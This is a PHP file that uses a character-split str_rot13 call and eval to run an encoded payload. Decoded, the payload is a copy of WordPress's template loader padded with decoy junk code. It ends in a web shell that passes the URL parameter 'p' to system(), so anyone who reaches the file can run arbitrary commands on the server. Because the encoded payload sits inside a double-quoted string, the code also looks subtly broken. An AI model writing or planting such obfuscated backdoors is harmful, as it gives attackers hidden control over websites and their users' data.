<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Ybnqf gur pbeerpg grzcyngr onfrq ba gur ivfvgbe'f hey
 *
 * @cnpxntr JbeqCerff
 */
vs ( jc_hfvat_gurzrf() ) {
	/**
	 * Sverf orsber qrgrezvavat juvpu grzcyngr gb ybnq.
	 *
	 * @fvapr 1.5.0
	 */
	qb_npgvba( 'grzcyngr_erqverpg' );
}

/**
 * Svygref jurgure gb nyybj 'URNQ' erdhrfgf gb trarengr pbagrag.
 *
 * Cebivqrf n fvtavsvpnag cresbeznapr ohzc ol rkvgvat orsber gur cntr
 * pbagrag ybnqf sbe 'URNQ' erdhrfgf. Frr #14348.
 *
 * @fvapr 3.5.0
 *
 * @cnenz obby $rkvg Jurgure gb rkvg jvgubhg trarengvat nal pbagrag sbe 'URNQ' erdhrfgf. Qrsnhyg gehr.
 */
vs ( 'URNQ' === $_FREIRE['ERDHRFG_ZRGUBQ'] && nccyl_svygref( 'rkvg_ba_uggc_urnq', gehr ) ) {
	rkvg;
}

// Cebprff srrqf naq genpxonpxf rira vs abg hfvat gurzrf.
vs ( vf_ebobgf() ) {
	/**
	 * Sverq jura gur grzcyngr ybnqre qrgrezvarf n ebobgf.gkg erdhrfg.
	 *
	 * @fvapr 2.1.0
	 */
	qb_npgvba( 'qb_ebobgf' );
	erghea;
} ryfrvs ( vf_snivpba() ) {
	/**
	 * Sverq jura gur grzcyngr ybnqre qrgrezvarf n snivpba.vpb erdhrfg.
	 *
	 * @fvapr 5.4.0
	 */
	qb_npgvba( 'qb_snivpba' );
	erghea;
} ryfrvs ( vf_srrq() ) {
	qb_srrq();
	erghea;
} ryfrvs ( vf_genpxonpx() ) {
	erdhver NOFCNGU . 'jc-genpxonpx.cuc';
	erghea;
}

vs ( jc_hfvat_gurzrf() ) {

	$gnt_grzcyngrf = neenl(
		'vf_rzorq'             => 'trg_rzorq_grzcyngr',
		'vf_404'               => 'trg_404_grzcyngr',
		'vf_frnepu'            => 'trg_frnepu_grzcyngr',
		'vf_sebag_cntr'        => 'trg_sebag_cntr_grzcyngr',
		'vf_ubzr'              => 'trg_ubzr_grzcyngr',
		'vf_cevinpl_cbyvpl'    => 'trg_cevinpl_cbyvpl_grzcyngr',
		'vf_cbfg_glcr_nepuvir' => 'trg_cbfg_glcr_nepuvir_grzcyngr',
		'vf_gnk'               => 'trg_gnkbabzl_grzcyngr',
		'vf_nggnpuzrag'        => 'trg_nggnpuzrag_grzcyngr',
		'vf_fvatyr'            => 'trg_fvatyr_grzcyngr',
		'vf_cntr'              => 'trg_cntr_grzcyngr',
		'vf_fvathyne'          => 'trg_fvathyne_grzcyngr',
		'vf_pngrtbel'          => 'trg_pngrtbel_grzcyngr',
		'vf_gnt'               => 'trg_gnt_grzcyngr',
		'vf_nhgube'            => 'trg_nhgube_grzcyngr',
		'vf_qngr'              => 'trg_qngr_grzcyngr',
		'vf_nepuvir'           => 'trg_nepuvir_grzcyngr',
	);
	$grzcyngr      = snyfr;

	// Ybbc guebhtu rnpu bs gur grzcyngr pbaqvgvbanyf, naq svaq gur nccebcevngr grzcyngr svyr.
	sbernpu ( $gnt_grzcyngrf nf $gnt => $grzcyngr_trggre ) {
		vs ( pnyy_hfre_shap( $gnt ) ) {
			$grzcyngr = pnyy_hfre_shap( $grzcyngr_trggre );
		}

		vs ( $grzcyngr ) {
			vs ( 'vf_nggnpuzrag' === $gnt ) {
				erzbir_svygre( 'gur_pbagrag', 'cercraq_nggnpuzrag' );
			}

			oernx;
		}
	}

	vs ( ! $grzcyngr ) {
		$grzcyngr = trg_vaqrk_grzcyngr();
	}

	/**
	 * Svygref gur cngu bs gur pheerag grzcyngr orsber vapyhqvat vg.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $grzcyngr Gur cngu bs gur grzcyngr gb vapyhqr.
	 */
	$grzcyngr = nccyl_svygref( 'grzcyngr_vapyhqr', $grzcyngr );
	vs ( $grzcyngr ) {
		vapyhqr $grzcyngr;
	} ryfrvs ( pheerag_hfre_pna( 'fjvgpu_gurzrf' ) ) {
		$gurzr = jc_trg_gurzr();
		vs ( $gurzr->reebef() ) {
			jc_qvr( $gurzr->reebef() );
		}
	}
	erghea;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>